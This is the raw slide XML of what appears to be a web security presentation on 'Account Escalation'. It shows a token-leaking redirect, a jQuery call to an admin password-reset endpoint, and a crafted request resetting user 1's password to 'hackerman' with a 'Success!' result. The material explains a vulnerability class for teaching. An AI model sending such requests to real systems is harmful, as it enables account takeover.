                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>admin.site.com/admin/?auth_token=[TOKEN] -&gt; app.site.com 🚫</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>admin.site.com/admin/settings?auth_token=[TOKEN] ✅</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre Medium"/>
                <a:ea typeface="Abhaya Libre Medium"/>
                <a:cs typeface="Abhaya Libre Medium"/>
                <a:sym typeface="Abhaya Libre Medium"/>
              </a:rPr>
              <a:t>But what can we do at this point?</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="3200400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="328" name="Shape 328"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="329" name="Google Shape;329;p44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="29799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 sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  var resetPasswordUrl = "/admin/users/reset_password";</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  $.ajax({</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>    url: resetPasswordUrl,</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>    type: 'POST',</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>    data: {</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>      id:userID</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>      password:password</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1600">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>    },</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="330" name="Google Shape;330;p44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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1" name="Google Shape;331;p44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="332" name="Google Shape;332;p44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Account Escalation</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="333" name="Google Shape;333;p44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="337" name="Shape 337"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="338" name="Google Shape;338;p45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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9" name="Google Shape;339;p45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="340" name="Google Shape;340;p45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="348925" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Account Escalation</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="341" name="Google Shape;341;p45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="342" name="Google Shape;342;p45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="3678900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>POST admin.site.com/admin/users/reset_password</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>userID=1&amp;password=hackerman</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>	Success! </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="3200400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre Medium"/>
              <a:ea typeface="Abhaya Libre Medium"/>
              <a:cs typeface="Abhaya Libre Medium"/>
              <a:sym typeface="Abhaya Libre Medium"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="346" name="Shape 346"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
